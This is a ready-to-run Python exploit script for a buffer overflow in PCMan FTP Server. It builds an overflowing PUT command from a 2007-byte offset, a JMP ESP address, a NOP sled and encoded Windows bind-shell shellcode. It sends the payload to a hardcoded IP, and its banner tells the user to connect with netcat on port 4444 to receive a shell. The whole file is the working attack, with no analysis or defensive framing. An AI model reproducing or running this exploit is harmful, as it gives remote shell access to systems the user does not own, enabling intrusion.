#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
pcman FTP Server Exploit with Shellcode
1. python pcman_ftp_server_sc.py
2. nc -v 172.16.73.129 4444
3. RECEIVE SHELL
#----------------------------------------------#
"""

print banner

# msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
shellcode = ("\xbf\x6d\x30\xa5\xa3\xd9\xc6\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x53\x31\x78\x12\x83\xe8\xfc\x03\x15\x3e\x47\x56\x19\xd6\x05"
"\x99\xe1\x27\x6a\x13\x04\x16\xaa\x47\x4d\x09\x1a\x03\x03\xa6"
"\xd1\x41\xb7\x3d\x97\x4d\xb8\xf6\x12\xa8\xf7\x07\x0e\x88\x96"
"\x8b\x4d\xdd\x78\xb5\x9d\x10\x79\xf2\xc0\xd9\x2b\xab\x8f\x4c"
"\xdb\xd8\xda\x4c\x50\x92\xcb\xd4\x85\x63\xed\xf5\x18\xff\xb4"
"\xd5\x9b\x2c\xcd\x5f\x83\x31\xe8\x16\x38\x81\x86\xa8\xe8\xdb"
"\x67\x06\xd5\xd3\x95\x56\x12\xd3\x45\x2d\x6a\x27\xfb\x36\xa9"
"\x55\x27\xb2\x29\xfd\xac\x64\x95\xff\x61\xf2\x5e\xf3\xce\x70"
"\x38\x10\xd0\x55\x33\x2c\x59\x58\x93\xa4\x19\x7f\x37\xec\xfa"
"\x1e\x6e\x48\xac\x1f\x70\x33\x11\xba\xfb\xde\x46\xb7\xa6\xb6"
"\xab\xfa\x58\x47\xa4\x8d\x2b\x75\x6b\x26\xa3\x35\xe4\xe0\x34"
"\x39\xdf\x55\xaa\xc4\xe0\xa5\xe3\x02\xb4\xf5\x9b\xa3\xb5\x9d"
"\x5b\x4b\x60\x0b\x53\xea\xdb\x2e\x9e\x4c\x8c\xee\x30\x25\xc6"
"\xe0\x6f\x55\xe9\x2a\x18\xfe\x14\xd5\x37\xa3\x91\x33\x5d\x4b"
"\xf4\xec\xc9\xa9\x23\x25\x6e\xd1\x01\x1d\x18\x9a\x43\x9a\x27"
"\x1b\x46\x8c\xbf\x90\x85\x08\xde\xa6\x83\x38\xb7\x31\x59\xa9"
"\xfa\xa0\x5e\xe0\x6c\x40\xcc\x6f\x6c\x0f\xed\x27\x3b\x58\xc3"
"\x31\xa9\x74\x7a\xe8\xcf\x84\x1a\xd3\x4b\x53\xdf\xda\x52\x16"
"\x5b\xf9\x44\xee\x64\x45\x30\xbe\x32\x13\xee\x78\xed\xd5\x58"
"\xd3\x42\xbc\x0c\xa2\xa8\x7f\x4a\xab\xe4\x09\xb2\x1a\x51\x4c"
"\xcd\x93\x35\x58\xb6\xc9\xa5\xa7\x6d\x4a\xd5\xed\x2f\xfb\x7e"
"\xa8\xba\xb9\xe2\x4b\x11\xfd\x1a\xc8\x93\x7e\xd9\xd0\xd6\x7b"
"\xa5\x56\x0b\xf6\xb6\x32\x2b\xa5\xb7\x16"
)

#EIP = 43396f43 -> offset at 2007
offset = 'A'*2007

#JMP ESP = !mona jmp -r esp -> 0x77c35459 or \x59\x54\xc3\x77
nowjump = '\x59\x54\xc3\x77'

bufferandshellcode = "\x90"*30 + shellcode

sploit =  offset + nowjump + bufferandshellcode + 'C'*(2500-len(offset+nowjump+bufferandshellcode)) 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nDestroy them with lazers..."
	s.connect(('172.16.73.129',21))
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.recv(1024)
	s.send('PUT ' + sploit + '\r\n\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close
	print "\nFire in the hole! Go pick up the pieces!"
except:
	print "ERROR! Shutting it dooooown.."